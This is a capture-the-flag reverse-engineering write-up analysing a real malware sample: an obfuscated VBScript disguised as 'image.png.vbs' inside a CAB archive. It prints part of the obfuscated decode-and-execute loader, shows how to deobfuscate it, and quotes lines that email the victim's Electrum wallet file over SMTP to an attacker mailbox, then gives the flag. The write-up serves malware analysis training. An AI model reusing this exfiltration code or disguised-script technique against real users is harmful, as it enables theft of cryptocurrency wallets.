# Give My Money Back 

### Category

Reverse

### Description

Joel sat at his desk, staring at the computer screen in front of her. She had just received a strange email from an unknown sender. Joel was intrigued. She hesitated for a moment, wondering if she should open the email or not. But her curiosity got the best of her, and she clicked on the message. Your goal is to help Joel find out who stole her money!

**Warning : The attached archive contains real malware, do not run it on your machine!** Archive password: infected

The flag corresponds to the email used for the exfiltration and the name of the last exfiltrated file, e.g. Hero{attacker@evil.com|passwords.txt}.

Format : Hero{email|filename}<br>
Author : xanhacks

### Files

- [GiveMyMoneyBack.zip](GiveMyMoneyBack.zip)

### Write Up

The ZIP archive contains another CAB (Microsoft Cabinet archive) archive.

```bash
$ 7z -pinfected x GiveMyMoneyBack.zip
[...]
$ file edf576f75abda49a095ab28d8a822360387446ff3254544ae19c991a33125feb
edf576f75abda49a095ab28d8a822360387446ff3254544ae19c991a33125feb: Microsoft Cabinet archive data, many, 15058 bytes, 2 files, at 0x2c +A "description.txt" +A "image.png.vbs", ID 2849, number 1, 9 datablocks, 0x1203 compression
```

You can extract the CAB archive using `7z` or `WinRAR`. This archive contains two files :

- `description.txt` : Useless file that contains text.
- `image.png.vbs` : Obfuscated VBScript file.

Here is the content of the VBScript file :

```vbscript
dIM jJkmPKZNvhSgPGmVLdvBVgOimreRTqiaEDiOcfNqy, AxEjAhgOVVhnXPrQQdPpAItXlqhuIRHOuDWWhvoyp, FwwcltIiESLKzggUCrjiaEUtjbmpvvGzwJNhoLFSp
Sub FncTqZirWltYCeayCzqdIRdKqrIzaKWRIZbSCprXS
[...]
axEjahGoVVhnxPRQQDPPaiTXLQhUIRhouDwwHvOyp = splIt(jjkMPKzNVhSgpGmvLdVBVGOimrerTQIaeDiocFNQY, chr(eVaL(75684/1802)))
for each MqNbrDAQjYRIwUnepBXnOsmlQlLuaaeTTwAchSFjz In AxEjahGovVHNxprqQdPPAITXLqhuiRHOuDwwhVOyP
FWwCltIiEsLkZgGUCRjiAEuTJbMpVVgZwJNhOLFSp = fwWCLtIieslKZgGUcrjIaEUTJBmPvvgZwjNHoLfSp & Chr(eVaL(MqnBrdaqjYRIwUnEPBxnoSMlqLluAaeTtwAchSFJz))
NEXT
lxtvaQuFKFKhmxjWgYFOSFuWJcYbTRdpUPuDAdnmD
end SUb
SUb LXTvAQufKFkHMxJwGYFOsFUwJcYBTRDPuPUdadnmD
eval(eXecUTe(fwwCltiieslkzggUCrJIaeUtjBmPvvGZwJNHoLFsp))
enD sUB
FnCtqZiRWLtyCeayCzQdIrDKqrIZAkwRIzBsCpRXs
```

You can replace the line `eval(eXecUTe(fwwCltiieslkzggUCrJIaeUtjBmPvvGZwJNHoLFsp))` by `Wscript.Echo (fwwCltiieslkzggUCrJIaeUtjBmPvvGZwJNHoLFsp)` to print the unobfuscated file.



```vbscript
> cscript image.png.vbs
[...]
Set Flds=iConf.Fields
Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername")    = "bmwqia84@mail.ru"
[...]
iMsg.AddAttachment "C:\Users\" & strUserName & "\AppData\Roaming\Electrum\wallets\default_wallet"
iMsg.Send
[...]
```

The script exfiltrates several cryptocurrency wallet (like `default_wallet`) via STMP using the email `bmwqia84@mail.ru`. So, we obtain the flag is `Hero{bmwqia84@mail.ru|default_wallet}`

### Flag

Hero{bmwqia84@mail.ru|default_wallet}
